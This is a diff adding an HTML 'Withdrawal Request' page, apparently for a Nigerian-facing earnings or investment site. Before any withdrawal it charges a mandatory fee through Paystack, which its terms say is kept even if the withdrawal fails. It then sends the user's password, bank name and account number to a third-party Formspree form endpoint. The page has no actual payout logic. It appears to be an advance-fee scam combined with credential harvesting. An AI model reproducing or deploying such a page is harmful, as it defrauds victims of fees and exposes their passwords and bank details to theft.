@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Withdrawal Request</title>
+  <script src="https://js.paystack.co/v1/inline.js"></script> <style>
+    /* Define your CSS Variables */
+    :root {
+      --bg-darkest: #121212;
+      --bg-card: #1a1a1a;
+      --text-light: #e0e0e0;
+      --text-muted: #888888;
+      --accent-dark-purple: #483D8B;
+      --accent-light-purple: #6A5ACD;
+      --border-color: #333333;
+      --error-color: #FF0000;
+      --live-red: #FF0000;
+      /* Netflix-Inspired Colors */
+      --netflix-red: #E50914;
+      --netflix-dark: #141414;
+      --netflix-darkest: #0d0d0d;
+      --netflix-light-grey: #E5E5E5;
+      --netflix-mid-grey: #444;
+      /* Modernized Palette Adjustments */
+      --primary-bg: #0C0C0C;
+      --secondary-bg: #1A1A1A;
+      --accent-color: #7B68EE;
+      --accent-hover: #9370DB;
+      --text-primary: #F0F0F0;
+      --text-secondary: #B0B0B0;
+      --border-subtle: #2A2A2A;
+      --gradient-start: rgba(123, 104, 238, 0.2);
+      --gradient-end: rgba(123, 104, 238, 0.0);
+    }
+
+    /* Apply styles using CSS Variables */
+    body {
+      font-family: sans-serif;
+      background: var(--primary-bg);
+      color: var(--text-primary);
+      padding: 2rem;
+    }
+    .container {
+      background: var(--secondary-bg);
+      max-width: 450px;
+      margin: auto;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.3);
+    }
+    h2 {
+      text-align: center;
+      color: var(--accent-color);
+      margin-bottom: 1rem;
+    }
+    input, select {
+      width: 100%;
+      padding: 0.7rem;
+      margin-bottom: 1rem;
+      border: 1px solid var(--border-subtle);
+      border-radius: 4px;
+      background: var(--bg-card);
+      color: var(--text-primary);
+    }
+    input::placeholder {
+      color: var(--text-secondary);
+    }
+    button {
+      width: 100%;
+      padding: 0.8rem;
+      background: var(--accent-color);
+      color: white;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+        background: var(--accent-hover);
+    }
+    button:disabled {
+      background: var(--text-muted);
+      cursor: not-allowed;
+    }
+    .checkbox {
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+    }
+    .checkbox label {
+      color: var(--text-primary);
+    }
+
+    /* Terms Popup Styles for Dark Theme */
+    #termsPopup {
+      background: rgba(0,0,0,0.85);
+    }
+    #termsPopup > div {
+      background: var(--secondary-bg);
+      color: var(--text-primary);
+      padding: 2rem;
+      max-width: 500px;
+      margin: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+    }
+    #termsPopup h3 {
+      color: var(--accent-color);
+    }
+    #termsPopup ul {
+      list-style-type: disc;
+      padding-left: 20px;
+    }
+    #termsPopup button {
+        background: var(--accent-color);
+    }
+    #termsPopup button:hover {
+        background: var(--accent-hover);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Withdrawal Request</h2>
+
+    <form id="withdrawalForm">
+      <input type="text" name="user_code" id="userCode" placeholder="User Code (4 digits)" maxlength="4" pattern="\d{4}" required>
+      <input type="password" name="user_password" id="userPassword" placeholder="Your Password (for withdrawals only)" required>
+      <input type="text" name="bank_name" id="bankName" placeholder="Bank Name" required>
+      <input type="text" name="account_number" id="accountNumber" placeholder="Account Number" pattern="\d+" required>
+      <select name="country" id="country" required>
+        <option value="">Select Your Country</option>
+        <option value="Nigeria">Nigeria</option>
+        <option value="Algeria">Algeria</option>
+        <option value="Angola">Angola</option>
+        <option value="Benin">Benin</option>
+        <option value="Botswana">Botswana</option>
+        <option value="Burkina Faso">Burkina Faso</option>
+        <option value="Burundi">Burundi</option>
+        <option value="Cabo Verde">Cabo Verde</option>
+        <option value="Cameroon">Cameroon</option>
+        <option value="Central African Republic">Central African Republic</option>
+        <option value="Chad">Chad</option>
+        <option value="Comoros">Comoros</option>
+        <option value="Congo (Brazzaville)">Congo (Brazzaville)</option>
+        <option value="Congo (Kinshasa)">Congo (Kinshasa)</option>
+        <option value="Cote d'Ivoire">Cote d'Ivoire</option>
+        <option value="Djibouti">Djibouti</option>
+        <option value="Egypt">Egypt</option>
+        <option value="Equatorial Guinea">Equatorial Guinea</option>
+        <option value="Eritrea">Eritrea</option>
+        <option value="Eswatini">Eswatini</option>
+        <option value="Ethiopia">Ethiopia</option>
+        <option value="Gabon">Gabon</option>
+        <option value="Gambia">Gambia</option>
+        <option value="Ghana">Ghana</option>
+        <option value="Guinea">Guinea</option>
+        <option value="Guinea-Bissau">Guinea-Bissau</option>
+        <option value="Kenya">Kenya</option>
+        <option value="Lesotho">Lesotho</option>
+        <option value="Liberia">Liberia</option>
+        <option value="Libya">Libya</option>
+        <option value="Madagascar">Madagascar</option>
+        <option value="Malawi">Malawi</option>
+        <option value="Mali">Mali</option>
+        <option value="Mauritania">Mauritania</option>
+        <option value="Mauritius">Mauritius</option>
+        <option value="Morocco">Morocco</option>
+        <option value="Mozambique">Mozambique</option>
+        <option value="Namibia">Namibia</option>
+        <option value="Niger">Niger</option>
+        <option value="Rwanda">Rwanda</option>
+        <option value="Sao Tome and Principe">Sao Tome and Principe</option>
+        <option value="Senegal">Senegal</option>
+        <option value="Seychelles">Seychelles</option>
+        <option value="Sierra Leone">Sierra Leone</option>
+        <option value="Somalia">Somalia</option>
+        <option value="South Africa">South Africa</option>
+        <option value="South Sudan">South Sudan</option>
+        <option value="Sudan">Sudan</option>
+        <option value="Tanzania">Tanzania</option>
+        <option value="Togo">Togo</option>
+        <option value="Tunisia">Tunisia</option>
+        <option value="Uganda">Uganda</option>
+        <option value="Zambia">Zambia</option>
+        <option value="Zimbabwe">Zimbabwe</option>
+        <option value="USA">USA</option>
+        <option value="UK">UK</option>
+        <option value="India">India</option>
+      </select>
+      <input type="number" name="withdraw_amount" id="withdrawAmount" placeholder="Amount to Withdraw In Naira" required min="1">
+
+      <div class="checkbox">
+        <input type="checkbox" id="termsCheck" required>
+        <label for="termsCheck">&nbsp; I agree to the service charge terms</label>
+      </div>
+
+      <button type="button" onclick="showTerms()">Withdraw</button>
+    </form>
+  </div>
+
+  <div id="termsPopup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); color:#000; z-index:9999; text-align:center; padding:2rem;">
+    <div style="background:#fff;color:#000; padding:2rem; max-width:500px; margin:auto; border-radius:8px;">
+      <h3>Withdrawal Terms</h3>
+      <p>Service charges apply per withdrawal:</p>
+      <ul style="text-align:left;">
+        <li>Nigerians: ₦500</li>
+        <li>Other African Countries: ₦1000</li>
+        <li>USA, UK, India: ₦2500</li>
+      </ul>
+      <p><strong>If you request more than your available balance, the withdrawal will fail, but your service charge will still be consumed.</strong></p>
+      <p>Service charge is mandatory for each withdrawal.</p>
+      <button onclick="startPaystackPayment()">I Understand, Continue</button>
+    </div>
+  </div>
+
+  <script>
+    // List of African countries (excluding Nigeria, which has a specific charge)
+    const AFRICAN_COUNTRIES_1000_CHARGE = [
+      "Algeria", "Angola", "Benin", "Botswana", "Burkina Faso", "Burundi", "Cabo Verde",
+      "Cameroon", "Central African Republic", "Chad", "Comoros", "Congo (Brazzaville)",
+      "Congo (Kinshasa)", "Cote d'Ivoire", "Djibouti", "Egypt", "Equatorial Guinea",
+      "Eritrea", "Eswatini", "Ethiopia", "Gabon", "Gambia", "Ghana", "Guinea",
+      "Guinea-Bissau", "Kenya", "Lesotho", "Liberia", "Libya", "Madagascar", "Malawi",
+      "Mali", "Mauritania", "Mauritius", "Morocco", "Mozambique", "Namibia", "Niger",
+      "Rwanda", "Sao Tome and Principe", "Senegal", "Seychelles", "Sierra Leone",
+      "Somalia", "South Africa", "South Sudan", "Sudan", "Tanzania", "Togo", "Tunisia",
+      "Uganda", "Zambia", "Zimbabwe"
+    ];
+
+    function showTerms() {
+      const form = document.getElementById('withdrawalForm');
+      if (!form.reportValidity()) return;
+
+      const termsChecked = document.getElementById('termsCheck').checked;
+      if (!termsChecked) {
+        alert('Please agree to the terms before continuing.');
+        return;
+      }
+      document.getElementById('termsPopup').style.display = 'block';
+    }
+
+    function startPaystackPayment() {
+      const email = `${document.getElementById('userCode').value}@example.com`; // Placeholder email for Paystack
+      const country = document.getElementById('country').value;
+
+      let serviceCharge = 0;
+      if (country === 'Nigeria') {
+          serviceCharge = 500;
+      } else if (AFRICAN_COUNTRIES_1000_CHARGE.includes(country)) {
+          serviceCharge = 1000;
+      } else if (country === 'USA' || country === 'UK' || country === 'India') {
+          serviceCharge = 2500;
+      } else {
+          // Fallback if country is not recognized, or for other non-listed countries (can adjust as needed)
+          serviceCharge = 1000;
+      }
+
+      const handler = PaystackPop.setup({
+        key: 'pk_live_6b671064b6a716c1ceffe82bf20a28c317a69584', // ✅ REPLACE WITH YOUR PUBLIC KEY
+        email: email,
+        amount: serviceCharge * 100, // Paystack uses kobo, multiply by 100
+        currency: 'NGN',
+        ref: 'withdraw-' + Math.floor((Math.random() * 1000000000) + 1),
+        callback: function(response) {
+          // Payment Success, now send data to Formspree
+          alert('Payment complete! Reference: ' + response.reference);
+          document.getElementById('termsPopup').style.display = 'none'; // Hide popup
+
+          // Gather all form data
+          const formData = {
+            user_code: document.getElementById('userCode').value,
+            user_password: document.getElementById('userPassword').value,
+            bank_name: document.getElementById('bankName').value,
+            account_number: document.getElementById('accountNumber').value,
+            country: document.getElementById('country').value,
+            withdraw_amount: document.getElementById('withdrawAmount').value,
+            payment_reference: response.reference, // Paystack reference
+            service_charge_paid: serviceCharge // Also send the service charge amount
+          };
+
+          // --- PLACE YOUR FORMSPREE URL HERE ---
+          const FORMSPREE_URL = 'https://formspree.io/f/xovdrlby'; // <---- IMPORTANT: Replace this with your actual Formspree URL!
+
+          fetch(FORMSPREE_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json' // Important for Formspree AJAX
+            },
+            body: JSON.stringify(formData)
+          })
+          .then(res => res.json())
+          .then(data => {
+            if (data.ok) {
+              alert('Withdrawal request submitted successfully!');
+              window.location.href = 'withdrawal-success.html'; // Redirect to a success page
+            } else {
+              alert('Failed to submit withdrawal request to Formspree. Please try again.');
+              console.error('Formspree error:', data);
+            }
+          })
+          .catch(error => {
+            alert('An error occurred while submitting your request.');
+            console.error('Error submitting to Formspree:', error);
+          });
+        },
+        onClose: function() {
+          alert('Transaction was cancelled.');
+          document.getElementById('termsPopup').style.display = 'none'; // Hide popup if transaction cancelled
+        }
+      });
+      handler.openIframe();
+    }
+  </script>
+</body>
+</html>
